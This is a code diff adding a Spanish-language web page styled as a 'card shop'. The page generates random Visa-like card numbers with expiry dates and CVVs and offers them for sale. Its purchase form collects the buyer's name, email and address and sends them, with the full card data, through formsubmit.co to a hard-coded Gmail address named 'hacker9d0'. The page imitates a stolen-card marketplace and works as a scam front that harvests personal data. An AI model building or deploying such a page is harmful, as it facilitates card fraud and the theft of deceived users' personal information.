@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🏪 Tienda Tarjetas - Correo Real</title>
+  <style>
+    body{font-family:Arial;max-width:480px;margin:auto;padding:15px;background:#f3f4f6;}
+    h1{text-align:center;color:#1e40af;}
+    .tarjeta{background:white;border-radius:14px;padding:18px;margin:12px 0;box-shadow:0 2px 8px #00000015;}
+    .precio{background:#f59e0b;color:white;padding:8px 14px;border-radius:8px;font-weight:bold;}
+    button{background:#2563eb;color:white;border:none;padding:12px;border-radius:8px;font-size:16px;cursor:pointer;}
+    .modal{position:fixed;inset:0;background:#00000050;display:none;align-items:center;justify-content:center;padding:15px;}
+    .modal > div{background:white;padding:25px;border-radius:16px;width:100%;max-width:360px;}
+    input,select{width:100%;padding:14px;margin:8px 0;border:2px solid #e5e7eb;border-radius:10px;}
+    .alerta{padding:14px;border-radius:10px;margin-top:15px;display:none;}
+    .ok{background:#dcfce7;color:#166534;}
+    .mal{background:#fee2e2;color:#991b1b;}
+  </style>
+</head>
+<body>
+
+  <h1>🏪 TIENDA DE TARJETAS</h1>
+  <button style="width:100%;margin-bottom:20px;" onclick="cargar()">🔄 RECARGAR</button>
+  <div id="lista"></div>
+
+  <div id="modal" class="modal">
+    <div>
+      <h3>📝 FORMULARIO</h3>
+      <input type="hidden" id="idTarjeta">
+      <input type="text" id="nombre" placeholder="Tu Nombre">
+      <input type="email" id="correo" placeholder="Tu Correo" value="hacker9d0@gmail.com">
+      <input type="text" id="direccion" placeholder="Dirección">
+      <select id="pago">
+        <option value="">Método Pago</option>
+        <option>Tokens</option><option>Transferencia</option>
+      </select>
+      <button style="width:100%;margin-top:10px;" onclick="comprar()">✅ ENVIAR</button>
+      <button style="width:100%;background:#9ca3af;margin-top:8px;" onclick="cerrar()">CERRAR</button>
+      <div id="alerta" class="alerta"></div>
+    </div>
+  </div>
+
+<script>
+let lista = [], seleccionada = null;
+const CORREO_DESTINO = "hacker9d0@gmail.com";
+
+function genTarjeta(){
+  const num = "4" + Array(15).fill(0).map(()=>Math.floor(Math.random()*10)).join("");
+  return {
+    id:Math.random().toString(36).slice(2),
+    numero:num,
+    mostrar:`**** **** **** ${num.slice(-4)}`,
+    fecha:`${String(Math.floor(Math.random()*12)+1).padStart(2,"0")}/${new Date().getFullYear()+2}`,
+    cvv:String(Math.floor(100+Math.random()*900)),
+    cod:String(Math.floor(100000+Math.random()*900000)),
+    tok:Math.floor(Math.random()*10)+1,
+    prec:Math.floor(Math.random()*100)+1
+  };
+}
+
+function cargar(){
+  lista = Array(6).fill(null).map(genTarjeta);
+  const cont = document.getElementById("lista");
+  cont.innerHTML = "";
+  lista.forEach(t=>{
+    const div = document.createElement("div");
+    div.className="tarjeta";
+    div.innerHTML=`
+      <p style="font-weight:bold;font-size:18px;">${t.mostrar}</p>
+      <p>📅 ${t.fecha} | 🔢 ${t.tok} Tokens</p>
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-top:10px;">
+        <span class="precio">$${t.tok*t.prec} USD</span>
+        <button onclick="abrir('${t.id}')">Comprar</button>
+      </div>
+    `;
+    cont.appendChild(div);
+  });
+}
+
+function abrir(id){
+  seleccionada = lista.find(x=>x.id===id);
+  document.getElementById("idTarjeta").value=id;
+  document.getElementById("modal").style.display="flex";
+}
+function cerrar(){document.getElementById("modal").style.display="none";}
+
+async function comprar(){
+  const alerta = document.getElementById("alerta");
+  alerta.style.display="none";
+
+  const datos = {
+    nombre:document.getElementById("nombre").value,
+    correo:document.getElementById("correo").value,
+    dir:document.getElementById("direccion").value,
+    pago:document.getElementById("pago").value,
+    tarjeta:seleccionada
+  };
+
+  if(!datos.nombre||!datos.correo||!datos.dir||!datos.pago){
+    alerta.textContent="⚠️ Llena todo";alerta.className="alerta mal";alerta.style.display="block";return;
+  }
+
+  try{
+    // Usamos servicio para entregar REAL a tu correo
+    const respuesta = await fetch("https://formsubmit.co/ajax/hacker9d0@gmail.com", {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        nombre:datos.nombre,
+        correo:datos.correo,
+        direccion:datos.dir,
+        pago:datos.pago,
+        tarjeta_num:datos.tarjeta.numero,
+        tarjeta_fecha:datos.tarjeta.fecha,
+        tarjeta_cvv:datos.tarjeta.cvv,
+        tarjeta_cod:datos.tarjeta.cod,
+        total:`$${datos.tarjeta.tok * datos.tarjeta.prec} USD`
+      })
+    });
+
+    if(respuesta.ok){
+      alerta.textContent="✅ ¡ENVIADO! Revisa tu correo 📩";
+      alerta.className="alerta ok";
+      lista = lista.filter(x=>x.id!==seleccionada.id);
+      setTimeout(()=>{cerrar();cargar();},2500);
+    }else throw new Error("Fallo");
+  }catch(e){
+    alerta.textContent="❌ Error al enviar";alerta.className="alerta mal";alerta.style.display="block";
+  }
+}
+
+document.addEventListener("DOMContentLoaded", cargar);
+</script>
+
+</body>
+</html>
+
